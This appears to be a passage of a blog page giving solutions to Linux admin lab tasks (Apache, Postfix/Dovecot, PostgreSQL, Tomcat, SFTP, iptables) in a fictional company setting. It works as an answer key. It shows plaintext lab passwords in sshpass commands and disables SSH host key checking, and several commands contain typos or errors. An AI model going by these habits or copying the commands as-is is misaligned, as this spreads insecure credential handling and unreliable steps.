</span></span><span style="display:flex;"><span>sshpass -p &lt;passwd&gt; ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no &lt;user&gt;@&lt;hostname&gt;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Install httpd package</span>
</span></span><span style="display:flex;"><span>yum install httpd -y
</span></span><span style="display:flex;"><span><span style="color:#75715e">#configure logrotate to rotate httpd logs</span>
</span></span><span style="display:flex;"><span>vi /etc/logrotate.d/http
</span></span><span style="display:flex;"><span><span style="color:#75715e">#start httpd service</span>
</span></span><span style="display:flex;"><span>systemctl start httpd
</span></span><span style="display:flex;"><span>systemctl status httpd
</span></span></code></pre></div>copy this into the http file under logrotate.d/
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>/var/log/httpd/*log <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  monthly
</span></span><span style="display:flex;"><span>  missingok
</span></span><span style="display:flex;"><span>  rotate <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>  notifempty
</span></span><span style="display:flex;"><span>  sharedscripts
</span></span><span style="display:flex;"><span>  compress
</span></span><span style="display:flex;"><span>  postrotate
</span></span><span style="display:flex;"><span>      /bin/systemctl reload httpd.service &gt; /dev/null 2&gt;/dev/null <span style="color:#f92672">||</span> true
</span></span><span style="display:flex;"><span>  endscript
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="apache-heading">Apache heading</h2>
<ul>
<li>We are working on hardening Apache web server on all app servers. As a part of this process we want to add some of the Apache response headers for security purpose. We are testing the settings one by one on all app servers. As per details mentioned below enable these headers for Apache:</li>
<li>Install httpd package on App Server 3 using yum and configure it to run on 3003 port, make sure to start its service.</li>
<li>Create an index.html file under Apache&rsquo;s default document root i.e /var/www/html and add below given content in it.</li>
<li>Welcome to the xFusionCorp Industries!</li>
<li>Configure Apache to enable below mentioned headers:</li>
<li>X-XSS-Protection header with value 1; mode=block</li>
<li>X-Frame-Options header with value SAMEORIGIN</li>
<li>X-Content-Type-Options header with value nosniff
=&gt; Note: You can test using curl on the given app server as LBR URL will not work for this task</li>
</ul>
<h6 id="solution-6">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to server app 3</span>
</span></span><span style="display:flex;"><span>sshpass -p BigGr33n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no ssh banner@stapp03
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#install httpd</span>
</span></span><span style="display:flex;"><span>yum install httpd -y
</span></span><span style="display:flex;"><span><span style="color:#75715e">#configure httpd to listen on port 3003, and enable the mentioned headers</span>
</span></span><span style="display:flex;"><span>vi /etc/httpd/conf/httpd.conf
</span></span><span style="display:flex;"><span>EDIT &gt; Listen <span style="color:#ae81ff">3003</span>
</span></span><span style="display:flex;"><span>INSERT &gt; Header set X-XSS-Protection <span style="color:#e6db74">&#34;1; mode=block&#34;</span>
</span></span><span style="display:flex;"><span>INSERT &gt; Header set X-Content-Type-Options nosniff
</span></span><span style="display:flex;"><span>INSERT &gt; Header always append X-Frame-Options SAMEORIGIN
</span></span><span style="display:flex;"><span><span style="color:#75715e">#create index.html</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Welcome to the xFusionCorp Industries!&#34;</span> &gt; /var/www/html/index.html
</span></span><span style="display:flex;"><span><span style="color:#75715e">#start the http service</span>
</span></span><span style="display:flex;"><span>systemctl start httpd
</span></span><span style="display:flex;"><span>systemctl status httpd
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>curl -i localhost:3003
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify again from jumphost</span>
</span></span><span style="display:flex;"><span>curl -i http://stapp03:3003
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="install-package">Install package</h2>
<ul>
<li>As per new application requirements shared by the Nautilus project development team, serveral new packages need to be installed on all app servers in Stratos Datacenter. Most of them are completed except for git.</li>
<li>Therefore, install the git package on all app-servers.</li>
</ul>
<h6 id="solution-7">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to app server 1,2 and 3</span>
</span></span><span style="display:flex;"><span>sshpass -p &lt;pass&gt; ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no &lt;user&gt;@&lt;hostname&gt;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to the root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#list all the installed packages</span>
</span></span><span style="display:flex;"><span>rpm -qa | grep git
</span></span><span style="display:flex;"><span><span style="color:#75715e">#install git</span>
</span></span><span style="display:flex;"><span>yum install git -y
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>yum list installed | grep git
</span></span><span style="display:flex;"><span>git version
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-find-command">Linux Find Command</h2>
<ul>
<li>During a routine security audit, the team identified an issue on the Nautilus App Server. Some malicious content was identified within the website code. After digging into the issue they found that there
might be more infected files. Before doing a cleanup they would like to find all similar files and copy them to a safe location for further investigation. Accomplish the task as per the following requirements:</li>
<li>a. On App Server 1 at location /var/www/html/official find out all files (not directories) having .js extension.</li>
<li>b. Copy all those files along with their parent directory structure to location /official on same server.</li>
<li>c. Please make sure not to copy the entire /var/www/html/official directory content.</li>
</ul>
<h6 id="solution-8">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#connect to app server 1</span>
</span></span><span style="display:flex;"><span>sshpass -p Ir0nM@n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no tony@stapp01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#check if /official exists</span>
</span></span><span style="display:flex;"><span>ls /official
</span></span><span style="display:flex;"><span>ls /var/www/html/
</span></span><span style="display:flex;"><span><span style="color:#75715e">#find all the js files under /var/www/html/official</span>
</span></span><span style="display:flex;"><span>find /var/www/html/official -name <span style="color:#e6db74">&#34;*.js&#34;</span> -type f -exec cp --parents <span style="color:#f92672">{}</span> /official/ <span style="color:#ae81ff">\;</span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>ls /official/
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-postfix-mail">Linux Postfix Mail</h2>
<ul>
<li>xFusionCorp Industries has planned to set up a common email server in Stork DC. After several meetings and recommendations they have decided to use postfix as their mail transfer agent and dovecot as an IMAP/POP3 server. We would like you to perform the following steps:</li>
<li>Install and configure postfix on Stork DC mail server.</li>
<li>Create an email account <a href="mailto:javed@stratos.xfusioncorp.com">javed@stratos.xfusioncorp.com</a> identified by BruCStnMT5.</li>
<li>Set its mail directory to /home/javed/Maildir.</li>
<li>Install and configure dovecot on the same server.</li>
</ul>
<h6 id="solution-9">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">## ssh to the mail server</span>
</span></span><span style="display:flex;"><span>sshpass -p Gr00T123 ssh -o StrictHostKeyChecking groot@stmail01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to the root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Confirm that yum is installed</span>
</span></span><span style="display:flex;"><span>rpm -qa | grep postfix
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Install postfix on the mail server</span>
</span></span><span style="display:flex;"><span>yum install postfix -y
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Configure postfix on the server</span>
</span></span><span style="display:flex;"><span>vi /etc/postfix/main.cf
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Find the line with #myhostname &amp; #mydomain and set it as follows</span>
</span></span><span style="display:flex;"><span>&gt;myhostname <span style="color:#f92672">=</span> stmail01.stratos.xfusioncorp.com
</span></span><span style="display:flex;"><span>&gt;mydomain <span style="color:#f92672">=</span> stratos.xfusioncorp.com
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Uncomment the &#39;#myorigin=$mydomain&#39; line</span>
</span></span><span style="display:flex;"><span>&gt;myorigin <span style="color:#f92672">=</span> $mydomain
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Uncomment the &#39;#inet_interfaces = all&#39; line</span>
</span></span><span style="display:flex;"><span>&gt; inet_interfaces <span style="color:#f92672">=</span> all
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Uncomment the &#39;#mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain&#39; line</span>
</span></span><span style="display:flex;"><span>&gt; mydestination <span style="color:#f92672">=</span> $myhostname, localhost.$mydomain, localhost, $mydomain
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Uncomment the &#39;#mynetworks = host IP address, =&gt; localhost&#39; line and replace it accordingly</span>
</span></span><span style="display:flex;"><span>&gt;mynetworks <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>host IP address<span style="color:#f92672">}</span>/24, 127.0.0.0/8
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Uncomment the &#39;#home_mailbox = Maildir/&#39; line</span>
</span></span><span style="display:flex;"><span>&gt; home_mailbox <span style="color:#f92672">=</span> Maildir/
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Save and quit the configuration file</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Start postfix and confirm it is working</span>
</span></span><span style="display:flex;"><span>systemctl start postfix
</span></span><span style="display:flex;"><span>systemctl status postfix
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Create the user account for javed</span>
</span></span><span style="display:flex;"><span>useradd javed
</span></span><span style="display:flex;"><span>passwd javed
</span></span><span style="display:flex;"><span>telnet stmail01 <span style="color:#ae81ff">25</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Enter the following settings:</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>&gt; EHLO localhost
</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>&gt; mail from: javed@stratos.xfusioncorp.com
</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>&gt; rcpt to: javed@stratos.xfusioncorp.com
</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>&gt; DATA
</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>&gt; test mail
</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>&gt; quit
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Install dovecot on mail server</span>
</span></span><span style="display:flex;"><span>yum install dovecot -y
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Configure dovecot</span>
</span></span><span style="display:flex;"><span>vi /etc/dovecot/dovecot.conf
</span></span><span style="display:flex;"><span><span style="color:#75715e">#tip&gt;:set nu</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Uncomment &#39;#protocols = imap pop3 lmtp&#39;</span>
</span></span><span style="display:flex;"><span>&gt; save and quit :wq
</span></span><span style="display:flex;"><span><span style="color:#75715e">#modify 10-mail.conf</span>
</span></span><span style="display:flex;"><span>vi /etc/dovecot/conf.d/10-mail.conf
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Uncomment the line &#39;#mail_location = maildir:~/Maildir&#39;</span>
</span></span><span style="display:flex;"><span>&gt; save and quit :wq
</span></span><span style="display:flex;"><span><span style="color:#75715e">#modify 10-auth.conf</span>
</span></span><span style="display:flex;"><span>vi /etc/dovecot/conf.d/10-auth.conf
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Uncomment the line &#39;#disable_plaintext_auth = yes&#39;</span>
</span></span><span style="display:flex;"><span>&gt; disable_plaintext_auth <span style="color:#f92672">=</span> yes
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Set the &#39;auth_mechanisms&#39; line</span>
</span></span><span style="display:flex;"><span>&gt; auth_mechanisms <span style="color:#f92672">=</span> plain login
</span></span><span style="display:flex;"><span>&gt; save and quit :wq
</span></span><span style="display:flex;"><span><span style="color:#75715e">#modfiy master.conf</span>
</span></span><span style="display:flex;"><span>vi 10-master.conf
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Uncomment and set the line &#39;#user = &#39;</span>
</span></span><span style="display:flex;"><span>&gt; user <span style="color:#f92672">=</span> postfix
</span></span><span style="display:flex;"><span>&gt; group <span style="color:#f92672">=</span> postfix
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Start dovecot service</span>
</span></span><span style="display:flex;"><span>systemctl start dovecot
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Test the configuration</span>
</span></span><span style="display:flex;"><span>telnet stmail01 <span style="color:#ae81ff">110</span>
</span></span><span style="display:flex;"><span>&gt; user javed
</span></span><span style="display:flex;"><span>&gt; pass <span style="color:#f92672">{</span>given-password<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>&gt; retr <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>&gt; quit
</span></span><span style="display:flex;"><span>&gt; ss -tulnp
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-process-troubleshooting">Linux Process Troubleshooting</h2>
<ul>
<li>The production support team of xFusionCorp Industries has deployed some of the latest monitoring tools to keep an eye on every service, application, etc. running on the systems. One of the monitoring systems reported about Apache service unavailability on one of the app servers in Stratos DC.</li>
<li>Identify the faulty app host and fix the issue. Make sure Apache service is up and running on all app hosts. They might not hosted any code yet on these servers so you need not to worry about if Apache isn&rsquo;t serving any pages or not, just make sure service is up and running. Also, do not try to change the Apache port on any host.</li>
</ul>
<h6 id="solution-10">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#First, we need to identify the faulty app. lets use curl from the jump host</span>
</span></span><span style="display:flex;"><span>curl http://stapp01:6200
</span></span><span style="display:flex;"><span>curl http://stapp02:6200
</span></span><span style="display:flex;"><span>curl http://stapp03:6200
</span></span><span style="display:flex;"><span><span style="color:#75715e">#In my case, stapp01 was the faulty app, lets ssh to it and find out whats the problem</span>
</span></span><span style="display:flex;"><span>sshpass -p Ir0nM@n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no tony@stapp01
</span></span><span style="display:flex;"><span>systemctl start httpd
</span></span><span style="display:flex;"><span>systemctl status httpd
</span></span><span style="display:flex;"><span>httpd -t
</span></span><span style="display:flex;"><span>journalctl -xe
</span></span><span style="display:flex;"><span>cat /etc/httpd/conf/httpd_conf | grep Listen
</span></span><span style="display:flex;"><span><span style="color:#75715e">#lets install netstat</span>
</span></span><span style="display:flex;"><span>yum install netstat -y
</span></span><span style="display:flex;"><span>netstat -tulnp |grep <span style="color:#ae81ff">6200</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#get the id of the current proccess using port 6200 and kill it, in my case it was 525</span>
</span></span><span style="display:flex;"><span>kill -9 <span style="color:#ae81ff">525</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#start the service and verify</span>
</span></span><span style="display:flex;"><span>systemctl start httpd
</span></span><span style="display:flex;"><span>systemctl status httpd
</span></span><span style="display:flex;"><span>curl http://stapp01:6200
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="install-and-configure-postgresql">Install and Configure PostgreSQL</h2>
<ul>
<li>The Nautilus application development team has shared that they are planning to deploy one newly developed application on Nautilus infra in Stratos DC. The application uses PostgreSQL database, so as a pre-requisite we need to set up PostgreSQL database server as per requirements shared below:</li>
<li>a. Install and configure PostgreSQL database on Nautilus database server.</li>
<li>b. Create a database user kodekloud_sam and set its password to B4zNgHA7Ya.</li>
<li>c. Create a database kodekloud_db8 and grant full permissions to user kodekloud_sam on this database.</li>
<li>d. Make appropriate settings to allow all local clients (local socket connections) to connect to the kodekloud_db8 database through kodekloud_sam user using md5 method (Please do not try to encrypt password with md5sum).</li>
<li>e. At the end its good to test the db connection using these new credentials from root user or server&rsquo;s sudo use</li>
</ul>
<h6 id="solution-11">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to the database server</span>
</span></span><span style="display:flex;"><span>sshpass -p Sp<span style="color:#ae81ff">\!</span>dy ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no peter@stdb01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#install postgresql</span>
</span></span><span style="display:flex;"><span>yum search all postgresql
</span></span><span style="display:flex;"><span>yum whatprovides postgresql
</span></span><span style="display:flex;"><span>yum install postgresql-server postgresql-contrib
</span></span><span style="display:flex;"><span><span style="color:#75715e">#iniate the db</span>
</span></span><span style="display:flex;"><span>postgresql-setup initdb
</span></span><span style="display:flex;"><span><span style="color:#75715e">#enable and start postgresql</span>
</span></span><span style="display:flex;"><span>systemctl enable postgresql <span style="color:#f92672">&amp;&amp;</span> systemctl start postgresql
</span></span><span style="display:flex;"><span><span style="color:#75715e">#create user and grant full permissions</span>
</span></span><span style="display:flex;"><span>sudo -u postgres psql
</span></span><span style="display:flex;"><span>&gt; CREATE USER &lt;username&gt; WITH PASSWORD &lt;password&gt;;
</span></span><span style="display:flex;"><span>&gt; CREATE DATABASE &lt;database_name&gt;;
</span></span><span style="display:flex;"><span>&gt; GRANT ALL PRIVILEGES ON DATABASE &lt;databse_name&gt; TO &lt;username&gt;; 
</span></span><span style="display:flex;"><span>&gt;<span style="color:#ae81ff">\q</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#configure to postgres to allow local socket cnx using md5 method</span>
</span></span><span style="display:flex;"><span>vi /var/lib/psql/data/pg_hba.conf
</span></span><span style="display:flex;"><span><span style="color:#75715e">#edit the following lines</span>
</span></span><span style="display:flex;"><span>&gt;local all all md5
</span></span><span style="display:flex;"><span>&gt;host all 127.0.0.1/32 md5
</span></span><span style="display:flex;"><span><span style="color:#75715e">#open postgresql.conf and uncomment listen_addresses line</span>
</span></span><span style="display:flex;"><span>vi /var/lib/psql/data/postgresql.conf
</span></span><span style="display:flex;"><span>&gt;listen_addresses <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#restart psq service</span>
</span></span><span style="display:flex;"><span>systemctl restart postgresql
</span></span><span style="display:flex;"><span>systemctl status postgresql
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verifying</span>
</span></span><span style="display:flex;"><span>psql -U &lt;username&gt; -d &lt;database_name&gt; -h 127.0.0.1 -W
</span></span><span style="display:flex;"><span>psql -U &lt;username&gt; -d &lt;database_name&gt; -h localhost -W
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="tomcat">Tomcat</h2>
<ul>
<li>The Nautilus application development team recently finished the beta version of one of their Java-based applications, which they are planning to deploy on one of the app servers in Stratos DC. After an internal team meeting, they have decided to use the tomcat application server. Based on the requirements mentioned below complete the task:</li>
<li>a. Install tomcat server on App Server 2 using yum.</li>
<li>b. Configure it to run on port 6300.</li>
<li>c. There is a ROOT.war file on Jump host at location /tmp. Deploy it on this tomcat server and make sure the webpage works directly on base URL i.e without specifying any sub-directory anything like this http://URL/ROOT .</li>
</ul>
<h6 id="solution-12">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to app server 2</span>
</span></span><span style="display:flex;"><span>sshpass -p Am3ric@ ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no steve@stapp02
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to the root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#install tomcat</span>
</span></span><span style="display:flex;"><span>yum install tomcat -y
</span></span><span style="display:flex;"><span><span style="color:#75715e">#run tomcat on port 6300</span>
</span></span><span style="display:flex;"><span>vi /etc/tomcat/server.xml
</span></span><span style="display:flex;"><span>&gt; look <span style="color:#66d9ef">for</span> Port and change it to &lt;Connector Port <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;6300&#34;</span>&gt;
</span></span><span style="display:flex;"><span>systemctl start tomcat
</span></span><span style="display:flex;"><span>systemctl status tomcat
</span></span><span style="display:flex;"><span><span style="color:#75715e">#from the jumphost copy the ROOT.war to app server2</span>
</span></span><span style="display:flex;"><span>scp ROOT.war steve@lstapp02:/tmp/
</span></span><span style="display:flex;"><span><span style="color:#75715e">#go back to the app server2</span>
</span></span><span style="display:flex;"><span>mv /tmp/ROOT.war /var/lib/tomcat/webapps/
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>curl localhost:6300
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="install-and-configure-sftp">Install and configure SFTP</h2>
<ul>
<li>Some of the developers from Nautilus project team have asked for SFTP access to at least one of the app server in Stratos DC. After going through the requirements, the system admins team has decided to configure the SFTP server on App Server 2 server in Stratos Datacenter. Please configure it as per the following instructions:</li>
<li>a. Create an SFTP user mariyam and set its password to BruCStnMT5.</li>
<li>b. Password authentication should be enabled for this user.</li>
<li>c. Set its ChrootDirectory to /var/www/appdata.</li>
<li>d. SFTP user should only be allowed to make SFTP connections.</li>
</ul>
<h6 id="solution-13">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to app server2</span>
</span></span><span style="display:flex;"><span>sshpass -p Am3ric@ ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no steve@stapp02  
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to the root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#make the folder appdata</span>
</span></span><span style="display:flex;"><span>mkdir -p /var/www/appdata
</span></span><span style="display:flex;"><span><span style="color:#75715e">#change perms and the owner of appdata folder</span>
</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">755</span> /var/www/appdata/
</span></span><span style="display:flex;"><span>chown root:root /var/www/appdata/
</span></span><span style="display:flex;"><span><span style="color:#75715e">#add user mariyam with appdata as its chrootDir</span>
</span></span><span style="display:flex;"><span>useradd -d /var/www/appdata/ mariyam
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>cat /etc/passwd
</span></span><span style="display:flex;"><span><span style="color:#75715e">#configure sshd</span>
</span></span><span style="display:flex;"><span>vi /etc/ssh/sshd_config
</span></span><span style="display:flex;"><span>&gt;PasswordAuthentication yes
</span></span><span style="display:flex;"><span>  &gt;ChrootDirectory %h
</span></span><span style="display:flex;"><span>  &gt;AllowTCPForwarding no
</span></span><span style="display:flex;"><span>  &gt;X11Forwarding no
</span></span><span style="display:flex;"><span>  &gt;ForceCommand internal-sftp
</span></span><span style="display:flex;"><span>  &gt;AllowAgentForwarding no
</span></span><span style="display:flex;"><span>  &gt;PermitTunnel no 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#restart sshd </span>
</span></span><span style="display:flex;"><span>systemctl restart sshd
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>sftp mariyam@stapp02
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="iptables-installation-and-configuration">IPtables Installation And Configuration</h2>
<ul>
<li>We have one of our website up and running on our Nautilus infrastructure in Stratos DC. Our security team has raised a concern that right now Apache’s port i.e 3000 is open for all since there is no firewall installed on these hosts. So we have decided to add some security layer for these hosts and after discussions and recommendations we have come up with below given requirements:</li>
<li>Install iptables and all its dependencies on each app host.</li>
<li>Block incoming port 3000 on all apps for everyone except for LBR host.</li>
<li>Make sure the rules should persist even after system reboot.</li>
</ul>
<h6 id="solution-14">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to the app servers</span>
</span></span><span style="display:flex;"><span>sshpass -p &lt;password&gt; ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no &lt;user&gt;@&lt;host&gt;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to the root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#install iptables</span>
</span></span><span style="display:flex;"><span>yum install iptables-services -y
</span></span><span style="display:flex;"><span>iptables --help
</span></span><span style="display:flex;"><span><span style="color:#75715e">#start the iptables </span>
</span></span><span style="display:flex;"><span>systemctl start iptables
</span></span><span style="display:flex;"><span>systemctl enable iptables
</span></span><span style="display:flex;"><span>systemctl status iptables
</span></span><span style="display:flex;"><span>iptables --list
</span></span><span style="display:flex;"><span><span style="color:#75715e">#allow LBR host</span>
</span></span><span style="display:flex;"><span>iptables -R INPUT <span style="color:#ae81ff">5</span> -p tcp --dport <span style="color:#ae81ff">3000</span> -s 172.16.238.14 -j ACCEPT <span style="color:#75715e">#-s is for source ip of the LBR, dport is destination port.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#block the incoming reqs</span>
</span></span><span style="display:flex;"><span>iptables -A INPUT -p tcp --dport <span style="color:#ae81ff">3000</span> -j DROP
</span></span><span style="display:flex;"><span><span style="color:#75715e">#save</span>
</span></span><span style="display:flex;"><span>service iptables save
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify from the jump host</span>
</span></span><span style="display:flex;"><span>curl 172.16.238.10:3000
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ssh to the LBR host</span>
</span></span><span style="display:flex;"><span>sshpass -p Mischi3f ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no loki@stlb01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>curl 172.16.238.10:3000
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="install-ansible">Install Ansible</h2>
<ul>
<li>During the weekly meeting, the Nautilus DevOps team discussed about the automation and configuration management solutions that they want to implement. While considering several options, the team has decided to go with Ansible for now due to its simple setup and minimal pre-requisites. The team wanted to start testing using Ansible, so they have decided to use jump host as an Ansible controller to test different kind of tasks on rest of the servers.</li>
<li>Install ansible version 4.7.0 on Jump host using pip3 only. Make sure Ansible binary is available globally on this system, i.e all users on this system are able to run Ansible commands.
Install Ansible</li>
</ul>
<h6 id="solution-15">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>pip3 install -U pip
</span></span><span style="display:flex;"><span>sudo pip3 install ansible<span style="color:#f92672">==</span>4.7.0
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="apache-troubleshooting">Apache Troubleshooting</h2>
<ul>
<li>xFusionCorp Industries uses some monitoring tools to check the status of every service, application, etc running on the systems. Recently, the monitoring system identified that Apache service is not running on some of the Nautilus Application Servers in Stratos Datacenter.
<ol>
<li>Identify the faulty Nautilus Application Server and fix the issue. Also, make sure Apache service is up and running on all Nautilus Application Servers. Do not try to stop any kind of firewall that is already running.</li>
<li>Apache is running on 3002 port on all Nautilus Application Servers and its document root must be /var/www/html on all app servers.</li>
<li>Finally you can test from jump host using curl command to access Apache on all app servers and it should be reachable and you should get some static page. E.g. curl http://172.16.238.10:3002/</li>
</ol>
</li>
</ul>
<h6 id="soluiton">Soluiton:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>sshpass -p &lt;password&gt; ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no &lt;username&gt;@&lt;hostname&gt;
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span>systemctl start httpd
</span></span><span style="display:flex;"><span>httpd -t
